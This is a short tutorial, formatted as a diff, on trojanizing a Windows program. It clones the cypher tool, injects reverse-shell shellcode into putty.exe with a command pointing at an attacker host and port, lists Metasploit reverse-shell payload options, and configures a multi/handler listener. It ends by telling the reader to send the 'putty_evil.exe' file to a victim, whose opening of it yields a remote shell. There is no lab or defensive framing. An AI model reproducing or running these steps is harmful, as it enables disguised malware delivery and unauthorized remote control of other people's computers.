@@ -1,0 +1,29 @@
+
+Hack Remote Windows 10 PC using Cypher (Adding Shellcode to PE files)
+
+First clone cypher repository from github, to do so type:
+git clone https://github.com/xan7r/cypher.git
+
+Now choose an executable file and copy to cypher folder to bind the cypher with any .exe file
+Here in my case I have copied putty.exe as a file to bind with cipher
+Note: only executable file can be binded.
+
+Now run the following command
+python addShell.py -f ./putty.exe -H 192.168.0.105 -P 4444 -p 0
+Specify payload.  Default shell_reverse_tcp.  Valid values are:
+0 – windows/shell_reverse_tcp
+1 – windows/meterpreter/reverse_http
+2 – windows/meterpreter/reverse_http +PrependMigrate
+3 – windows/meterpreter/reverse_https
+4 – windows/meterpreter/reverse_https +PrependMigrate
+
+
+Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed. Start metasploit using msfconsole
+
+use exploit/multi/handler
+set payload windows/shell_reverse_tcp
+set lhost 192.168.0.105
+set lport 4444
+exploit
+Now send the binded putty_evil .exe to the victim, as soon as he opens the file a shell session will open
+
